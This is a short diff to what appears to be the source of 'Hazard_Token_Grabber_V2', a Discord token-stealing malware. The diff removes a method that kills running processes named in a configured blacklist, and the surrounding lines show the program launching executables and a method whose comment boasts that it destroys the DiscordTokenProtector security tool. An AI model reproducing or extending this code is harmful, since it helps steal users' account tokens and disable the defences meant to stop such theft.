@@ -195,16 +195,7 @@ class Hazard_Token_Grabber_V2(functions):
                             except PermissionError:
                                 pass
                             os.startfile(app + self.sep + _dir + '.exe')
-
-    async def killProcesses(self):
-        blackListedPrograms = self.fetchConf('blackListedPrograms')
-        for proc in psutil.process_iter():
-            if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
-                try:
-                    proc.kill()
-                except (psutil.NoSuchProcess, psutil.AccessDenied):
-                    pass
-
+                            
     async def bypassTokenProtector(self):
         # Easily destroys and fucks up the token-protector by https://github.com/andro2157/DiscordTokenProtector
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
